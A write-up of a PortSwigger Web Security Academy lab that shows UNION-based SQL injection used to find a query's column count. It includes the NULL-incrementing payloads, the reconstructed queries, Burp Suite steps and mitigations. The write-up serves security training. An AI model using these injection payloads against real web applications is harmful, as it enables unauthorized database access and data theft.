# 🔗 Lab 03: SQL Injection — UNION Attack (Determining Columns)

> **Lab URL:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)  
> **Difficulty:** 🟡 Practitioner  
> **Status:** ✅ Solved

---

## 📋 Lab Description

> *"This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique, in subsequent labs, to build the full attack. To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values."*

---

## 🔍 Reconnaissance

### Step 1: Identify the Injection Point
The application has a product category filter. Clicking different categories changes the URL:

```
https://<lab-id>.web-security-academy.net/filter?category=Tech+gifts
```

The `category` parameter is directly passed to the backend SQL query.

### Step 2: Test for SQL Injection
I tested the parameter with a single quote to see if the query breaks:

```
/filter?category=Tech+gifts'
```

**Result:** Internal Server Error (500) — confirms SQL syntax error, indicating the input is directly concatenated into the query.

---

## 🚀 Exploitation

### Goal: Determine the Number of Columns

To perform a **UNION attack**, both the original query and the injected query must return the **same number of columns**. If the column count doesn't match, the database throws an error.

I used the **`UNION SELECT NULL`** technique to enumerate the column count by incrementing the number of `NULL` values until the query succeeds.

---

### Attempt 1: One NULL

```
Tech+gifts'+UNION+SELECT+NULL--
```

**Result:** ❌ **500 Internal Server Error**

The database rejected the query because the original query returns **more than 1 column**, but `UNION SELECT NULL` only returns 1 column.

<img width="2560" height="1368" alt="image" src="https://github.com/user-attachments/assets/f5f2b364-9d0e-4c18-b400-511a591f6f34" />


> **Note:** The intercepted request shows `UNION+SELECT+NULL` with a `500 Internal Server Error` response. Column count does not match.

---

### Attempt 2: Two NULLs

```
Tech+gifts'+UNION+SELECT+NULL,NULL--
```

**Result:** ❌ **500 Internal Server Error**

Still not enough columns. The original query returns **more than 2 columns**.

<img width="2560" height="1368" alt="Screenshot 2026-08-22 001820" src="https://github.com/user-attachments/assets/32e90afd-1d87-4ed2-9a57-80a94bc1bf3f" />


> **Note:** The intercepted request shows `UNION+SELECT+NULL,NULL` with a `500 Internal Server Error` response. Column count still does not match.

---

### Attempt 3: Three NULLs ✅

```
Tech+gifts'+UNION+SELECT+NULL,NULL,NULL--
```

**Result:** ✅ **200 OK**

The query executed successfully! The database accepted the `UNION` because both queries now return **3 columns**.

<img width="2560" height="1368" alt="Screenshot 2026-08-22 001731" src="https://github.com/user-attachments/assets/bccb8d38-27f3-41b6-b6f1-eaca5bf56b26" />


> **Note:** The intercepted request shows `UNION+SELECT+NULL,NULL,NULL` with a `200 OK` response. The column count matches — **3 columns confirmed**.

---

### What Happens?

**Original Query:**
```sql
SELECT * FROM products 
WHERE category = 'Tech gifts' AND released = 1
```

**Injected Query (1 NULL):**
```sql
SELECT * FROM products 
WHERE category = 'Tech gifts' UNION SELECT NULL--' AND released = 1
```
→ ❌ Error: "All queries combined using a UNION must have an equal number of expressions"

**Injected Query (2 NULLs):**
```sql
SELECT * FROM products 
WHERE category = 'Tech gifts' UNION SELECT NULL,NULL--' AND released = 1
```
→ ❌ Error: Same mismatch

**Injected Query (3 NULLs):**
```sql
SELECT * FROM products 
WHERE category = 'Tech gifts' UNION SELECT NULL,NULL,NULL--' AND released = 1
```
→ ✅ Success! Both queries return **3 columns**.

---

## 🛠️ Burp Suite Intercept

I used **Burp Suite** to intercept and modify the request before sending it to the server.

### Steps:
1. Configured Firefox proxy to route through Burp Suite (127.0.0.1:8080)
2. Turned on **Intercept** in Burp Suite Proxy tab
3. Clicked on a category in the web application
4. Sent the intercepted request to **Repeater** for repeated testing
5. Incrementally added `NULL` values until the response returned `200 OK`


---

## 📸 Proof of Concept

### After Injection (3 NULLs)

<img width="2560" height="1368" alt="Screenshot 2026-08-22 001336" src="https://github.com/user-attachments/assets/ae263fc3-7f7a-4dfe-8a7d-00b406d205e0" />


As seen in the screenshot:
- The payload `Tech+gifts'+UNION+SELECT+NULL,NULL,NULL--` was injected into the `category` parameter
- The page displayed the products normally with **no error**
- The `UNION` query executed successfully, confirming **3 columns** in the original query
- Lab shows **"Congratulations, you solved the lab!"**

---

## 🧠 Key Takeaways

### 1. Vulnerability Root Cause
The application constructs SQL queries using **string concatenation** instead of **parameterized queries**, allowing an attacker to append a `UNION SELECT` statement.

### 2. Why `NULL`?
- `NULL` is **data-type agnostic** — it can represent any data type (string, integer, date, etc.)
- This makes it the perfect placeholder when you don't yet know the column data types
- Once the column count is known, you can replace `NULL` with actual data extraction payloads

### 3. Enumeration Strategy
| Attempt | Payload | Response | Meaning |
|---------|---------|----------|---------|
| 1st | `UNION SELECT NULL` | 500 Error | Too few columns |
| 2nd | `UNION SELECT NULL,NULL` | 500 Error | Still too few |
| 3rd | `UNION SELECT NULL,NULL,NULL` | 200 OK | ✅ **3 columns confirmed** |

### 4. Impact
- **Data Exfiltration:** Once column count is known, sensitive data can be extracted from other tables
- **Database Fingerprinting:** The `UNION` technique reveals database structure
- **Full Table Dumps:** In subsequent labs, this leads to retrieving passwords, credit cards, etc.

### 5. Mitigation Strategies
| Defense | Implementation |
|---------|---------------|
| **Parameterized Queries** | Use prepared statements (`?` placeholders) |
| **Input Validation** | Whitelist allowed characters; reject `UNION`, `SELECT`, `NULL` |
| **ORM Frameworks** | Use ORMs that automatically handle query construction |
| **WAF Rules** | Deploy Web Application Firewall with SQLi detection |
| **Least Privilege** | Database accounts should have minimal required permissions |

### 6. Why This Matters for AppSec
Understanding UNION-based SQL Injection is critical because:
- It's the **most common** technique for extracting data via SQLi
- It allows **complete database enumeration** once column count is known
- It appears in **nearly every SQLi exploitation scenario** after initial detection
- It leads directly to **credential theft**, **PII exposure**, and **compliance violations**

---

## 📚 References

- [PortSwigger — SQL Injection UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---


> 📝 **Author:** Saber Hasan Swoyon    
> 📅 **Date Solved:** 2026-08-22
